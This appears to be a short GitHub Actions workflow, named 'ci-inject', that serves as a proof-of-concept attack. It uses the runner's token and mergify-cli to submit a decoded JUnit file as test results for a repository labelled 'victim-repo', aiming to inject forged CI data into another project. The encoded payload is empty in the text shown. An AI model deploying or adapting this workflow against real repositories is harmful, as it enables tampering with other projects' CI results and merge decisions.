name: ci-inject
on: push
permissions:
  id-token: write
  contents: read
jobs:
  inject:
    runs-on: ubuntu-latest
    env:
      MERGIFY_TOKEN: ${{ github.token }}
    steps:
      - run: echo  | base64 -d > j.xml
      - run: pip install mergify-cli
      - run: mergify ci junit-process --repository mgfidorlabri/victim-repo --tests-target-branch main j.xml || true
